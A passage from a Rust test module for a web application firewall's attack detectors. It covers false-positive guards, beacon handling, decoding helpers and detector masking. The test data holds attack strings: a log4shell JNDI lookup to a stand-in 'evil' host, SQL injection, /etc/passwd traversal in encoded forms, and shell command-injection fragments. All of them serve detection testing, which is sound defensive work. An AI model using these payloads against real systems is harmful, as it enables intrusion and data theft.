            assert!(
                !form_body_is_opaque_beacon(&h, &body),
                "high-signal shape must stay scannable: {shape}"
            );
        }
    }

    #[test]
    fn beacon_with_stray_subshell_metachars_stays_opaque() {
        // 2026-06-18 round-2 FP: real Akamai `sensor_data` beacons are ~5 KB
        // of high-entropy printable ASCII and contain stray `` `id` `` /
        // `$(ls)` / `${x}` / `{{y}}` shapes BY CHANCE. Those bare 1–2 char
        // metacharacters must NOT re-admit the beacon — otherwise the body
        // scanner re-trips cmdi/sqli on the random blob (the cmdi/sqli FP
        // root cause). Only high-specificity multi-char tokens re-admit.
        let mut blob = high_entropy_blob();
        blob.push_str("q`id`w$(ls)e${x}r{{y}}t");
        let body = format!("{{\"sensor_data\":\"{blob}\"}}");
        let h = headers_ct("text/plain;charset=UTF-8");
        assert!(
            form_body_is_opaque_beacon(&h, &body),
            "beacon with only stray bare metachars must stay opaque",
        );
    }

    #[test]
    fn beacon_text_plain_with_embedded_equals_stays_opaque() {
        // Real Akamai `sensor_data` text/plain bodies are JSON-ish and carry
        // `=` (base64 padding) — the gate must not split on `=` for
        // text/plain or the candidate value truncates and the beacon escapes.
        let body = format!("{{\"sensor_data\":\"{}Hi8=;8,17,0,0\"}}", high_entropy_blob());
        let h = headers_ct("text/plain;charset=UTF-8");
        assert!(
            form_body_is_opaque_beacon(&h, &body),
            "text/plain beacon with embedded '=' must stay opaque",
        );
    }

    #[test]
    fn beacon_log4shell_jndi_still_scanned() {
        // The one multi-char `${…}` shape we must never skip: log4shell.
        let h = headers_ct("text/plain");
        let body = format!("{}${{jndi:ldap://evil/a}}", high_entropy_blob());
        assert!(
            !form_body_is_opaque_beacon(&h, &body),
            "log4shell ${{jndi:}} must keep the body scannable",
        );
    }

    #[test]
    fn beacon_low_entropy_long_value_is_scanned() {
        // A long but low-entropy value (repeated char) is not opaque.
        let body = format!("notes={}", "a".repeat(320));
        let h = headers_ct("application/x-www-form-urlencoded");
        assert!(!form_body_is_opaque_beacon(&h, &body));
    }

    #[test]
    fn legit_graphql_query_is_not_recon_but_introspection_is() {
        // 2026-05-20 FP fix — a normal GraphQL query (incl. the
        // benign `__typename` meta-field) must NOT trip the recon
        // detector; only introspection (`__schema` / `__type(` /
        // IntrospectionQuery) is recon.
        let detectors = default_detectors();
        let m = http::Method::GET;
        let h = http::HeaderMap::new();
        let b = BodyPeek::empty();

        // Legit query the operator flagged — must produce NO signal.
        let legit: http::Uri = "/r/api/aggregator/graphql?query=%7B%20findContent(%20brand%3A%20%22berries%22%20environment%3A%20%22production%22%20contentType%3A%20%22marketing_spots_pdp%22%20query%3A%20%22%7B%7B%5C%22brand%5C%22%3A%20%5C%22berries%5C%22%7D%20%7D%22%20locale%3A%20%22en-us%22%20)%20%7B%20content%20__typename%20%7D%7D".parse().unwrap();
        let req = view(&m, &legit, &h, &b);
        let (signals, _) =
            run_all_filtered_timed(&detectors, DetectorMask::all_enabled(), &req, |_, _| {});
        assert!(
            signals.is_empty(),
            "legit GraphQL query must not fire any detector: {:?}",
            signals.iter().map(|s| s.tag.as_str()).collect::<Vec<_>>(),
        );

        // Introspection — must still flag recon.
        let introspect: http::Uri =
            "/api/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D".parse().unwrap();
        let req = view(&m, &introspect, &h, &b);
        let (signals, _) =
            run_all_filtered_timed(&detectors, DetectorMask::all_enabled(), &req, |_, _| {});
        assert!(
            signals.iter().any(|s| s.tag == "recon_path"),
            "GraphQL introspection should still trip recon: {:?}",
            signals.iter().map(|s| s.tag.as_str()).collect::<Vec<_>>(),
        );
    }

    struct AlwaysFire(&'static str);
    impl Detector for AlwaysFire {
        fn id(&self) -> &'static str {
            self.0
        }
        fn inspect(&self, _req: &RequestView<'_>) -> Vec<Signal> {
            vec![Signal { score: 40, tag: self.0.into(), field: "test".into() }]
        }
    }

    #[test]
    fn ai_short_circuits_when_base_detector_fires() {
        // 2026-05-20 — the AI detector must NOT run when a Base
        // detector already matched; it MUST run when none did.
        let m = http::Method::GET;
        let (_, u, h, b) = make_req("/");
        let req = view(&m, &u, &h, &b);
        let mask = DetectorMask::all_enabled();

        // Base detector fires → AI deferred + skipped.
        let with_base: Vec<Box<dyn Detector>> =
            vec![Box::new(AlwaysFire("sqli")), Box::new(AlwaysFire("ai"))];
        let (signals, fired) =
            run_all_filtered_timed(&with_base, mask, &req, |_, _| {});
        assert!(fired.contains(&"sqli"));
        assert!(!fired.contains(&"ai"), "AI ran despite a Base detector match");
        assert!(!signals.iter().any(|s| s.tag == "ai"));

        // No base detector fires → AI runs.
        struct NeverFire;
        impl Detector for NeverFire {
            fn id(&self) -> &'static str { "sqli" }
            fn inspect(&self, _req: &RequestView<'_>) -> Vec<Signal> { Vec::new() }
        }
        let ai_only: Vec<Box<dyn Detector>> =
            vec![Box::new(NeverFire), Box::new(AlwaysFire("ai"))];
        let (signals, fired) =
            run_all_filtered_timed(&ai_only, mask, &req, |_, _| {});
        assert!(fired.contains(&"ai"), "AI should run when no Base detector fired");
        assert!(signals.iter().any(|s| s.tag == "ai"));
    }

    #[test]
    fn borderline_benign_traffic_produces_no_signal() {
        // 2026-05-20 FP review — realistic legit traffic that
        // *resembles* attacks (the classic WAF false-positive
        // sources): SQL keywords in natural language, math `<`/`>`,
        // internal redirects, absolute CDN/OAuth URLs, semicolon/pipe
        // delimited params, handlebars, bracketed array params, and
        // probe-like substrings inside legit path segments. With AI
        // as the fallback for novel/obfuscated attacks, the Base
        // signature detectors must NOT fire on any of these.
        let detectors = default_detectors();
        let m = http::Method::GET;
        let h = http::HeaderMap::new();
        let b = BodyPeek::empty();
        let cases = [
            // SQL keywords in legitimate natural-language / params
            ("nl-select", "/search?q=select%20a%20size%20for%20your%20shoes"),
            ("nl-union", "/products?q=union%20jack%20flag%20t-shirt"),
            ("nl-where", "/help?q=where%20is%20my%20order"),
            ("nl-order-by", "/catalog?sort=price&order=desc"),
            ("nl-drop", "/blog?title=how%20to%20drop%20a%20table%20safely"),
            ("delete-account", "/api/users/123?action=delete"),
            // XSS-ish legit
            ("math-lt-gt", "/calc?expr=5%3C3%20%26%26%202%3E1"),
            ("emoji-lt3", "/post?msg=%3C3%20you%20all"),
            ("legit-html-desc", "/preview?html=%3Cb%3Ebold%3C%2Fb%3E%20text"),
            // path-ish legit
            ("redirect-internal", "/login?redirect=/account/settings"),
            ("file-dotted", "/download?file=report.2024.final.pdf"),
            ("semver-path", "/assets/v1.2.3/app.js"),
            // SSRF-ish legit URL params
            ("legit-img-url", "/proxy?url=https%3A%2F%2Fcdn.example.com%2Fimg%2Fhero.png"),
            ("oauth-redirect", "/oauth/callback?redirect_uri=https%3A%2F%2Fapp.example.com%2Fdone"),
            // command-ish legit (semicolons / pipes in normal params)
            ("semicolon-filter", "/list?filter=price%3Aasc%3Bcategory%3Ashoes"),
            ("pipe-delimited", "/report?cols=name%7Cprice%7Cstock"),
            // template-ish (handlebars in a legit templating param)
            ("handlebars-name", "/render?tpl=Hello%20%7B%7Buser.first_name%7D%7D"),
            // nosql-ish legit (bracketed array params — common in PHP/Rails)
            ("array-param", "/search?tags%5B%5D=red&tags%5B%5D=blue"),
            ("filter-bracket", "/products?filter%5Bcolor%5D=red&filter%5Bsize%5D=10"),
            // recon-ish legit (paths that contain probe-like substrings)
            ("env-in-path", "/api/environment/config"),
            ("admin-product", "/administration-guide"),
            ("git-in-name", "/docs/using-git-with-our-api"),
        ];
        for (label, path) in cases {
            let uri: http::Uri = path.parse().unwrap();
            let req = view(&m, &uri, &h, &b);
            let (signals, _) =
                run_all_filtered_timed(&detectors, DetectorMask::all_enabled(), &req, |_, _| {});
            assert!(
                signals.is_empty(),
                "false positive on borderline-benign `{label}` ({path}): {:?}",
                signals.iter().map(|s| format!("{}:{}", s.tag, s.score)).collect::<Vec<_>>(),
            );
        }
    }

    #[test]
    fn benign_traffic_categories_produce_no_signal() {
        // 2026-05-20 FP guard — the AppSec brief's "commonly
        // legitimate" categories (ad-tech, analytics, encoded JSON,
        // CDN cache-bust, tracking IDs, RTB, browser telemetry,
        // normal catalog/search) MUST NOT trip any detector. Locks
        // in FP-safety against future pattern changes.
        let detectors = default_detectors();
        let m = http::Method::GET;
        let h = http::HeaderMap::new();
        let b = BodyPeek::empty();
        let benign = [
            ("google-ads-gampad", "/gampad/ads?gdfp_req=1&output=vast&sz=640x480&iu=/1234/video&correlator=1620000000"),
            ("ga-analytics-collect", "/collect?v=1&_v=j96&tid=UA-12345-1&cid=555&t=pageview&dl=https%3A%2F%2Fshop.example.com%2Fcatalog&dt=Catalog&z=1620000000"),
            ("url-encoded-json", "/api/track?data=%7B%22event%22%3A%22view%22%2C%22sku%22%3A%22ABC-123%22%2C%22price%22%3A19.99%7D"),
            ("cdn-cache-bust", "/assets/app.js?v=4.2.1&_=1620000000"),
            ("fbclid-tracking", "/landing?utm_source=fb&utm_medium=cpc&fbclid=IwAR0abcDEF1234567890xyz"),
            ("long-adtech-qs", "/rtb/bid?imp=1&w=300&h=250&bidfloor=0.5&dealid=xyz&crid=creative_998877&adm=%3Cdiv%3Ead%3C%2Fdiv%3E&nurl=https%3A%2F%2Fwin.example.com%2Fn"),
            ("browser-telemetry", "/beacon?navStart=1620000000&domComplete=1620000123&fp=a1b2c3d4e5&res=1920x1080&tz=-480"),
            ("normal-catalog", "/catalog?sort=price&dir=asc&cat=shoes&page=2"),
            ("normal-search", "/search?q=blue%20running%20shoes%20size%2010"),
            ("graphql-typename", "/api/graphql?query=%7Bme%7Bid%20__typename%7D%7D"),
        ];
        for (label, path) in benign {
            let uri: http::Uri = path.parse().unwrap();
            let req = view(&m, &uri, &h, &b);
            let (signals, _) =
                run_all_filtered_timed(&detectors, DetectorMask::all_enabled(), &req, |_, _| {});
            assert!(
                signals.is_empty(),
                "false positive on benign `{label}`: {:?}",
                signals.iter().map(|s| s.tag.as_str()).collect::<Vec<_>>(),
            );
        }
    }

    #[test]
    fn default_detectors_count() {
        let d = default_detectors();
        // sqli + xss + path_traversal + ssrf + header_injection
        // + body_abuse + recon + brute_force + command_injection
        // + template_injection + nosql_injection + open_redirect
        // + jwt_inspection + cookie_injection.
        assert_eq!(d.len(), 14);
    }

    /// Drift guard (VELOCITY_SEQUENCE_BUG_REPORT, 2026-06-12). Every
    /// detector the proxy registers must have an `id()` that maps back
    /// to a `DetectorClass`; otherwise `mask.is_enabled_id(d.id())`
    /// falls through to the unknown-id → `true` path and the detector
    /// runs UNCONDITIONALLY, silently bypassing the operator's mask.
    /// (That was the velocity bug: `id()` was "velocity_sequence" but
    /// the class is "velocity".) This fails the build the next time an
    /// `id()` drifts from its class.
    #[test]
    fn all_registered_detectors_map_to_a_class() {
        // Force-enable the opt-in stateful detectors so the canary
        // constructor registers all of them (velocity, behavior_signals).
        let cfg = aegis_core::config::DetectorsConfig {
            behavior_signals: aegis_core::config::DetectorToggle { enabled: true },
            velocity: aegis_core::config::DetectorToggle { enabled: true },
            ..aegis_core::config::DetectorsConfig::default()
        };
        let canary_paths = canary::CanaryPaths::new(&[]);
        for d in default_detectors_with_canary(&cfg, &canary_paths, None) {
            assert!(
                DetectorClass::from_id(d.id()).is_some(),
                "detector '{}' has no matching DetectorClass — mask gating silently no-ops",
                d.id(),
            );
        }
    }

    #[test]
    fn clean_request_no_signals() {
        let detectors = default_detectors();
        let (m, u, h, b) = make_req("/");
        let req = view(&m, &u, &h, &b);
        let signals = run_all(&detectors, &req);
        assert!(signals.is_empty());
    }

    #[test]
    fn filtered_skips_disabled_class() {
        // Build a request that would normally trip the SQLi detector.
        let detectors = default_detectors();
        let (m, u, h, b) = (
            http::Method::GET,
            "/api?id=1+UNION+SELECT+password+FROM+users".parse::<http::Uri>().unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        );
        let req = view(&m, &u, &h, &b);

        // With SQLi enabled — at least one signal.
        let mask = DetectorMask::all_enabled();
        let signals = run_all_filtered(&detectors, mask, &req);
        assert!(
            signals.iter().any(|s| s.tag.contains("sqli")),
            "expected sqli signal, got {:?}",
            signals.iter().map(|s| s.tag.as_str()).collect::<Vec<_>>(),
        );

        // With SQLi disabled — no sqli signal even though the
        // request would otherwise trip the detector.
        let masked = mask.with(DetectorClass::Sqli, false);
        let signals = run_all_filtered(&detectors, masked, &req);
        assert!(
            !signals.iter().any(|s| s.tag.contains("sqli")),
            "sqli signal leaked despite disabled class: {:?}",
            signals.iter().map(|s| s.tag.as_str()).collect::<Vec<_>>(),
        );
    }

    #[test]
    fn filtered_with_all_disabled_returns_empty() {
        let detectors = default_detectors();
        let (m, u, h, b) = (
            http::Method::GET,
            "/api?id=1+UNION+SELECT+password+FROM+users"
                .parse::<http::Uri>()
                .unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        );
        let req = view(&m, &u, &h, &b);
        let signals = run_all_filtered(&detectors, DetectorMask::none(), &req);
        assert!(
            signals.is_empty(),
            "no detector should fire with all classes off, got {:?}",
            signals.iter().map(|s| s.tag.as_str()).collect::<Vec<_>>(),
        );
    }

    // ----- run_all_filtered_observed (PROM-T2) ----------------------------

    #[test]
    fn observed_returns_same_signals_as_unobserved_path() {
        let detectors = default_detectors();
        let (m, u, h, b) = (
            http::Method::GET,
            "/api?id=1+UNION+SELECT+password+FROM+users"
                .parse::<http::Uri>()
                .unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        );
        let req = view(&m, &u, &h, &b);
        let mask = DetectorMask::all_enabled();
        let plain = run_all_filtered(&detectors, mask, &req);
        let (observed, _fired) = run_all_filtered_observed(&detectors, mask, &req);
        assert_eq!(plain.len(), observed.len(), "signal counts must match");
    }

    #[test]
    fn observed_reports_fired_detector_classes() {
        let detectors = default_detectors();
        let (m, u, h, b) = (
            http::Method::GET,
            "/api?id=1+UNION+SELECT+password+FROM+users"
                .parse::<http::Uri>()
                .unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        );
        let req = view(&m, &u, &h, &b);
        let (_signals, fired) = run_all_filtered_observed(
            &detectors,
            DetectorMask::all_enabled(),
            &req,
        );
        assert!(fired.contains(&"sqli"), "fired list missing sqli: {fired:?}");
    }

    #[test]
    fn observed_reports_empty_fired_when_no_detector_trips() {
        let detectors = default_detectors();
        let (m, u, h, b) = make_req("/health");
        let req = view(&m, &u, &h, &b);
        let (signals, fired) = run_all_filtered_observed(
            &detectors,
            DetectorMask::all_enabled(),
            &req,
        );
        assert!(signals.is_empty());
        assert!(fired.is_empty(), "no detector should fire on a clean request");
    }

    // ---------- S1 (2026-05-18) decoder helpers -------------------------

    #[test]
    fn url_decode_repeated_unwraps_double_encoding() {
        // `%2525` → `%25` → `%`. Three passes needed for triple-encoded.
        assert_eq!(url_decode_repeated("%2525", 3), "%");
        assert_eq!(url_decode_repeated("%252fetc%252fpasswd", 3), "/etc/passwd");
    }

    #[test]
    fn url_decode_repeated_stops_when_no_change() {
        // Idempotent on already-decoded input — no extra allocations
        // beyond the first comparison.
        assert_eq!(url_decode_repeated("hello", 3), "hello");
        assert_eq!(url_decode_repeated("/etc/passwd", 3), "/etc/passwd");
    }

    #[test]
    fn url_decode_repeated_respects_max_passes() {
        // Two-layer encoding with only one pass returns intermediate.
        assert_eq!(url_decode_repeated("%2525", 1), "%25");
        assert_eq!(url_decode_repeated("%2525", 2), "%");
    }

    #[test]
    fn unicode_escape_decode_handles_u_form() {
        assert_eq!(unicode_escape_decode("\\u002e\\u002e/x"), "../x");
        assert_eq!(unicode_escape_decode("\\u0041\\u0042"), "AB");
    }

    #[test]
    fn unicode_escape_decode_handles_x_form() {
        assert_eq!(unicode_escape_decode("\\x2e\\x2e/x"), "../x");
        assert_eq!(unicode_escape_decode("\\x27 OR 1=1"), "' OR 1=1");
    }

    #[test]
    fn unicode_escape_decode_passes_through_no_backslash() {
        // Cheap pre-filter: input without `\` returns as-is.
        assert_eq!(unicode_escape_decode("/etc/passwd"), "/etc/passwd");
        assert_eq!(unicode_escape_decode(""), "");
    }

    #[test]
    fn unicode_escape_decode_passes_through_malformed() {
        // `\u00` is not a complete escape — emit literal backslash.
        assert_eq!(unicode_escape_decode("\\u00"), "\\u00");
        // `\z` is not a recognised escape — same.
        assert_eq!(unicode_escape_decode("\\z"), "\\z");
    }

    #[test]
    fn html_entity_decode_handles_new_path_entities() {
        // The new named entities added in S1 cover characters
        // attackers use to disguise `..`, `\`, `#`.
        assert_eq!(html_entity_decode("&period;&period;/x"), "../x");
        assert_eq!(html_entity_decode("&dot;&dot;/x"), "../x");
        assert_eq!(html_entity_decode("&bsol;windows"), "\\windows");
        assert_eq!(html_entity_decode("&num;46"), "#46");
    }

    #[test]
    fn html_entity_decode_handles_new_shell_entities() {
        // The shell-metachar set lets us catch entity-encoded
        // command-injection (`&semi;&dollar;(id)`).
        assert_eq!(html_entity_decode("&semi;&dollar;(id)"), ";$(id)");
        assert_eq!(html_entity_decode("&verbar;whoami"), "|whoami");
        assert_eq!(html_entity_decode("&grave;id&grave;"), "`id`");
    }

    #[test]
    fn normalize_for_detection_includes_raw_and_decoded_variants() {
        let v = normalize_for_detection("%252e%252e/etc");
        // Raw + repeated-URL-decoded; html/unicode passes don't
        // contribute new variants here.
        assert!(v.iter().any(|s| s == "%252e%252e/etc"));
        assert!(v.iter().any(|s| s == "../etc"));
    }

    #[test]
    fn normalize_for_detection_dedupes_identical_variants() {
        // Clean input — every decoder pass is a no-op, so we
        // should get just the original once.
        let v = normalize_for_detection("/health");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0], "/health");
    }

    #[test]
    fn normalize_for_detection_emits_entity_decoded_variant() {
        let v = normalize_for_detection("&period;&period;/etc");
        assert!(v.iter().any(|s| s == "../etc"));
    }

    #[test]
    fn normalize_for_detection_emits_unicode_decoded_variant() {
        let v = normalize_for_detection("\\u002e\\u002e/etc");
        assert!(v.iter().any(|s| s == "../etc"));
    }

    // 2026-06-16 (sec-regression §3a) — hex-blob decode pass.
    #[test]
    fn hex_blob_decode_splices_printable_sqli() {
        // `0x27206f7220313d31` = `' or 1=1`.
        assert_eq!(
            hex_blob_decode("/?id=0x27206f7220313d31").as_deref(),
            Some("/?id=' or 1=1"),
        );
    }

    #[test]
    fn hex_blob_decode_skips_binary_blobs() {
        // GPU id / hash decode to non-printable bytes → left untouched,
        // so no decoded variant is produced (guards the removed-rule FP).
        assert_eq!(hex_blob_decode("/sync?gpu=0x0000C0DE"), None);
        assert_eq!(hex_blob_decode("/t?sig=0xdeadbeefcafebabe"), None);
    }

    #[test]
    fn hex_blob_decode_returns_none_without_hex() {
        assert_eq!(hex_blob_decode("/api/users?page=1"), None);
    }

    #[test]
    fn hex_blob_decode_ignores_odd_length_runs() {
        // Odd nibble count can't form whole bytes — leave as-is.
        assert_eq!(hex_blob_decode("/?x=0x123"), None);
    }

    #[test]
    fn normalize_for_detection_emits_hex_decoded_variant() {
        let v = normalize_for_detection("/?id=0x27206f7220313d31");
        assert!(v.iter().any(|s| s == "/?id=' or 1=1"));
    }

    #[test]
    fn observed_skips_disabled_classes_in_fired_list() {
        let detectors = default_detectors();
        let (m, u, h, b) = (
            http::Method::GET,
            "/api?id=1+UNION+SELECT+password+FROM+users"
                .parse::<http::Uri>()
                .unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        );
        let req = view(&m, &u, &h, &b);
        // SQLi disabled — the fired list must NOT contain "sqli".
        let masked = DetectorMask::all_enabled().with(DetectorClass::Sqli, false);
        let (_signals, fired) = run_all_filtered_observed(&detectors, masked, &req);
        assert!(
            !fired.contains(&"sqli"),
            "fired list leaked disabled class: {fired:?}",
        );
    }
}
